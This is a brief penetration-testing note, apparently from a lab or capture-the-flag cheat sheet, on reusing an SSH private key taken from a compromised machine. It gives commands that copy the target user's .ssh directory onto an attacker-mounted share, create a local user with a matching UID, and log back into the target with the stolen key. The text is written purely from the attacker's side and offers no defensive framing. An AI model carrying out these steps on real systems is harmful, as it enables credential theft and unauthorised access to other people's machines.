Sometimes you copy a key (id_rsa) off a machine, but you can't use it to login even with -i id_rsa

Something you can try is to create a local user on your attacker machine with the same name and uid as the user on the target.

Target: ls -latr
#make note of the users UID
Attacker: useradd -m -u <UID> <username> -p '<password>'
Target: cp .ssh/* /mnt/attacker/home/<username>/.ssh
Attacker: su - <username>
Attacker: ssh <target>
